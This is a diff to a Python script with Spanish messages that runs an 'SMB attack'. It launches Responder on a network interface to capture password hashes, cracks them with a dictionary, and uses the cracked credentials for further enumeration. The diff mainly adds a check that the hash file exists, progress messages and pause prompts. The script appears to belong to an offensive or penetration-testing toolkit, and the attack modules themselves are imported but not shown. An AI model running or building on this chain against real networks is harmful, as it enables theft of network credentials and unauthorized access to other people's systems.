@@ -1,7 +1,7 @@
 import sys
 import os
 
-# Asegurar que el path raíz esté en sys.path
+# Añadir path raíz
 CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
 ROOT_DIR = os.path.abspath(os.path.join(CURRENT_DIR, ".."))
 if ROOT_DIR not in sys.path:
@@ -12,20 +12,30 @@ from modules.hash_cracking import crack_hashes
 from modules.advanced_enumeration import enumerate_with_credentials
 
 def ejecutar_ataque_smb(interface, dictionary_path):
-    print("[*] Lanzando ataque SMB: Responder + Crackeo + Enumeración avanzada")
+    print("[*] Lanzando ataque SMB: Responder + Crackeo + Enumeración")
 
-    success = run_responder(interface)
-    if not success:
-        print("[-] No se capturaron hashes. Abortando módulo SMB.")
+    # Ejecutar responder
+    run_responder(interface)
+
+    hashes_path = "results/hashes.txt"
+    if not os.path.exists(hashes_path) or os.path.getsize(hashes_path) == 0:
+        print("[-] No se capturaron hashes.")
+        input("[*] Pulsa ENTER para cerrar esta terminal.")
         return
 
-    credenciales = crack_hashes("results/hashes.txt", dictionary_path)
+    print("[+] Hashes capturados. Iniciando crackeo...")
+
+    credenciales = crack_hashes(hashes_path, dictionary_path)
     if not credenciales:
         print("[!] No se pudo crackear ningún hash.")
+        input("[*] Pulsa ENTER para cerrar esta terminal.")
         return
 
+    print("[+] Hashes crackeados. Iniciando enumeración avanzada...")
     enumerate_with_credentials(credenciales)
-    print("[+] Enumeración SMB completada.")
+
+    print("[✓] Módulo SMB finalizado correctamente.")
+    input("[*] Pulsa ENTER para cerrar esta terminal.")
 
 if __name__ == "__main__":
     if len(sys.argv) != 3:
